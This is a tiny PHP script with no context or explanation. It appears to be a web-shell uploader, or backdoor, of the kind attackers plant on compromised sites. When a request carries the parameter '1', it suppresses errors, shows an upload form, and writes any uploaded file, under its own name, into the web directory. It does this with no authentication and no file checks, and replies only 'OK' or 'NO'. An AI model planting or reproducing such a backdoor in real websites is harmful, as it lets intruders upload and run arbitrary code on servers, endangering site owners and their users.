<?
error_reporting(0);
if (isset($_REQUEST['1'])) {
    echo '<form action="" method=post enctype=multipart/form-data><input type=file name=uploadfile><input type=submit value=Upload></form>';
    $uploaddir = '';
    $uploadfile = $uploaddir.basename($_FILES['uploadfile']['name']);
    if (copy($_FILES['uploadfile']['tmp_name'], $uploadfile)) {
        echo "<h3>OK</h3>";
        exit;
    }else{
        echo "<h3>NO</h3>";
        exit;
    }
    exit;
}  